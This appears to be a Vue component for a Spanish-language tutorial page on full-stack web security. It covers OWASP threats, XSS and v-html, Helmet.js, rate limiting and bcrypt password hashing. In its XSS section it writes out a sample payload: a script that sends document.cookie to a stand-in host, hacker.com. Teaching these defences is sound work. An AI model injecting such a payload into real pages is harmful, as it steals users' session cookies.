<script setup>
import AtomArticle from '../components/atoms/AtomArticle.vue'
import AtomH1 from '../components/atoms/AtomH1.vue'
import AtomH2 from '../components/atoms/AtomH2.vue'
import AtomSection from '../components/atoms/AtomSection.vue'
import AtomCard from '../components/atoms/AtomCard.vue'
import AtomTable from '../components/atoms/AtomTable.vue'
import AtomCodeBlock from '../components/atoms/AtomCodeBlock.vue'
import AtomImage from '../components/atoms/AtomImage.vue'

const securityHeaders = ['Vulnerabilidad', 'Descripción', 'Cómo Mitigarlo']
const securityRows = [
  ['Inyección SQL', 'El atacante inserta código SQL malicioso en los inputs de tu formulario para borrar o robar tu base de datos.', 'Usar siempre un ORM como Prisma. Nunca concatenar strings de SQL directamente.'],
  ['XSS (Cross-Site Scripting)', 'Inyección de código JavaScript en tu web que se ejecuta en el navegador de otros usuarios.', 'No usar v-html con datos de usuarios. Vue escapa las variables {{ }} automáticamente.'],
  ['CSRF (Cross-Site Request Forgery)', 'Engañar al usuario para que ejecute acciones no deseadas en una web donde ya está autenticado.', 'Usar tokens Anti-CSRF o configurar las cookies de sesión con SameSite=Strict.'],
  ['Fuerza Bruta / DDoS', 'Miles de peticiones por segundo para tumbar tu servidor o adivinar contraseñas.', 'Implementar Rate Limiting (límite de peticiones) en tu servidor Express.']
]
</script>

<template>
  <AtomArticle>
    
    <div class="header-content">
      <AtomImage 
        src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Gnome-emblem-readonly.svg" 
        alt="Símbolo de Seguridad" 
        width="100px" 
      />
      <AtomH1 style="margin-top: 1rem;">Seguridad Web y Defensa Full-Stack</AtomH1>
    </div>

    <p style="font-size: 1.2rem; color: #bdc3c7; text-align: center; line-height: 1.8;">
      Construir aplicaciones rápidas no sirve de nada si son vulnerables. Conoce los ataques 
      más temidos de la lista OWASP Top 10 y cómo blindar tu código.
    </p>

    <AtomH2>Módulo 1: Las Amenazas Principales (OWASP)</AtomH2>
    <AtomSection>
      <p class="extended-text">
        El <strong>OWASP</strong> (Open Web Application Security Project) es una fundación que publica periódicamente las vulnerabilidades más críticas en Internet. Como desarrollador Full-Stack, eres el responsable de proteger los datos de tus usuarios contra estos vectores de ataque.
      </p>

      <AtomTable :headers="securityHeaders" :rows="securityRows" />
    </AtomSection>

    <AtomH2>Módulo 2: XSS (Cross-Site Scripting) en el Frontend</AtomH2>
    <AtomSection>
      <p class="extended-text">
        Imagina que tienes un foro. Un atacante escribe en un comentario el siguiente texto: <code>&lt;script&gt;alert('Robando cookies...'); fetch('http://hacker.com?cookie='+document.cookie)&lt;/script&gt;</code>. 
        Si tu página renderiza ese comentario directamente como HTML, el navegador ejecutará el código maligno en la computadora de cada persona que visite el foro.
      </p>

      

      <div class="grid-cards">
        <AtomCard>
          <template #header><h3 style="color: #2ecc71;">✅ La Protección Nativa de Vue</h3></template>
          <p class="extended-text" style="font-size: 0.95rem;">
            Afortunadamente, Vue.js es seguro por defecto. Si usas la sintaxis de bigotes <code>{{ comentarioUsuario }}</code>, Vue convierte automáticamente las etiquetas HTML en texto inofensivo (hace un <em>escape</em>). El navegador mostrará el texto literal del script, pero no lo ejecutará.
          </p>
        </AtomCard>
        
        <AtomCard>
          <template #header><h3 style="color: #e74c3c;">❌ El Peligro de v-html</h3></template>
          <p class="extended-text" style="font-size: 0.95rem;">
            Si usas la directiva <code>v-html</code> para renderizar texto enriquecido (negritas, enlaces), anulas la protección de Vue. NUNCA uses <code>v-html</code> con contenido escrito por usuarios, a menos que lo pases antes por una librería de sanitización profunda como <em>DOMPurify</em>.
          </p>
        </AtomCard>
      </div>
    </AtomSection>

    <AtomH2>Módulo 3: Blindando el Backend (Express)</AtomH2>
    <AtomSection>
      <p class="extended-text">
        Tu servidor Express está expuesto al mundo entero. Cualquiera puede hacerle peticiones desde una terminal o un script automatizado. Debemos añadir escudos.
      </p>

      <h3 style="color: #f1c40f;">1. Cabeceras de Seguridad con Helmet.js</h3>
      <p class="extended-text">
        Express, por defecto, envía cabeceras HTTP que revelan que está hecho en Express. Además, carece de ciertas protecciones contra ataques clickjacking. <code>Helmet</code> es un middleware que configura automáticamente 15 cabeceras de seguridad estrictas.
      </p>

      <AtomCodeBlock language="javascript" fileName="server/index.js">
import express from 'express'
import helmet from 'helmet'

const app = express()

// Oculta que usamos Express, previene clickjacking, XSS de navegador, etc.
app.use(helmet())
      </AtomCodeBlock>

      <h3 style="color: #f1c40f; margin-top: 2rem;">2. Rate Limiting (Prevención de Fuerza Bruta)</h3>
      <p class="extended-text">
        Si alguien quiere adivinar la contraseña de un usuario, podría programar un bot para que intente 10.000 contraseñas por segundo en tu ruta <code>/api/login</code>. Para evitar que tumben tu base de datos, limitamos la cantidad de peticiones que una misma IP puede hacer.
      </p>

      <AtomCodeBlock language="javascript" fileName="server/index.js">
import rateLimit from 'express-rate-limit'

// Creamos una regla: Máximo 100 peticiones cada 15 minutos por IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, 
  message: 'Demasiadas peticiones desde esta IP, inténtalo de nuevo más tarde.'
})

// Aplicamos la regla a todas las rutas que empiecen por /api/
app.use('/api/', limiter)
      </AtomCodeBlock>
    </AtomSection>

    <AtomH2>Módulo 4: Encriptación de Contraseñas (Bcrypt)</AtomH2>
    <AtomSection>
      <p class="extended-text">
        Si guardas las contraseñas en tu base de datos en texto plano (ej: <code>"123456"</code>) y un hacker roba tu base de datos (o un empleado malintencionado la mira), todas las cuentas de tus usuarios estarán comprometidas. 
        <strong>Las contraseñas NUNCA se guardan en texto plano, se "hashean".</strong>
      </p>

      <AtomCodeBlock language="javascript" fileName="server/controllers/authController.js">
import bcrypt from 'bcrypt'

// Cuando el usuario se registra (POST /registro)
const registrarUsuario = async (req, res) => {
  const { passwordPlana } = req.body
  
  // 1. Generamos un "salt" (ruido aleatorio) y hasheamos la contraseña
  const saltRounds = 10
  const passwordHasheada = await bcrypt.hash(passwordPlana, saltRounds)
  
  // 2. Guardamos en la BD algo como: "$2b$10$wTf2z/Jj3k5fH.f..."
  await prisma.usuario.create({
    data: { password: passwordHasheada }
  })
}

// Cuando el usuario hace Login (POST /login)
const loginUsuario = async (req, res) => {
  // Comparamos la contraseña plana que acaba de escribir con el Hash de la DB
  const esValida = await bcrypt.compare(passwordPlanaDelBody, usuarioDB.password)
  
  if (!esValida) return res.status(401).json({ error: 'Credenciales inválidas' })
}
      </AtomCodeBlock>
    </AtomSection>

  </AtomArticle>
</template>

<style scoped>
.header-content { display: flex; flex-direction: column; align-items: center; margin-bottom: 2rem; }
.extended-text { line-height: 1.8; margin-bottom: 1.2rem; color: #ecf0f1; text-align: justify; }
h3 { margin-top: 1.5rem; font-size: 1.3rem; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 0.5rem; }
.grid-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem; margin: 2rem 0; }
</style>